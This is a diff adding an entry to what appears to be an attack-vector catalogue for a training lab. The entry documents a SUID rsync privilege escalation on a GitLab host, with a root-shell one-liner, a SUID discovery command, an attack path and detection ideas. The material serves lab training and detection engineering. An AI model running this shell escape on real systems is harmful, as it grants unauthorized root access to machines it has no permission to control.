@@ -241,6 +241,39 @@ SSH as secondary_user06 (no sudo)
 
 ---
 
+### SUID rsync — Shell Escape to Root (gitlab)
+
+| Field | Detail |
+|---|---|
+| **Host** | gitlab (10.2.50.15) |
+| **Entry point** | `secondary_user06` (SSH, no sudo) |
+| **Condition** | `/usr/bin/rsync` has SUID root bit set |
+| **Primitive** | rsync `-e` flag specifies a custom remote shell command — used to spawn a privileged shell via `-p` |
+| **GTFOBins** | [rsync — SUID](https://gtfobins.github.io/gtfobins/rsync/#suid) |
+| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |
+
+**Exploit:**
+
+```bash
+rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
+```
+
+**Attack path:**
+
+```
+SSH as secondary_user06 (no sudo)
+  → Discover SUID binaries: find / -perm -4000 -type f 2>/dev/null
+  → Identify /usr/bin/rsync with SUID root
+  → rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x → root shell (T1548.001)
+```
+
+**Detection opportunities:**
+
+- `rsync` process with `-e` argument containing `/bin/sh` (Sysmon/auditd process arguments)
+- `/bin/sh -p` spawned with euid=0 from rsync parent
+
+---
+
 ## By Technology
 
 | Technology | Vectors |
@@ -249,7 +282,7 @@ SSH as secondary_user06 (no sudo)
 | ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
 | IIS + ASP.NET + MSSQL | Web application attacks, SQL injection, authentication bypass |
 | GitLab CE | Source code exposure, CI/CD pipeline abuse, secret leakage, SUID privesc |
-| Linux (gitlab, ops) | SUID binary abuse (R, apt-get, less) |
+| Linux (gitlab, ops) | SUID binary abuse (R, apt-get, less, rsync) |
 | Elastic SIEM | Detection engineering, alert tuning, log analysis |
 
 ## Notes
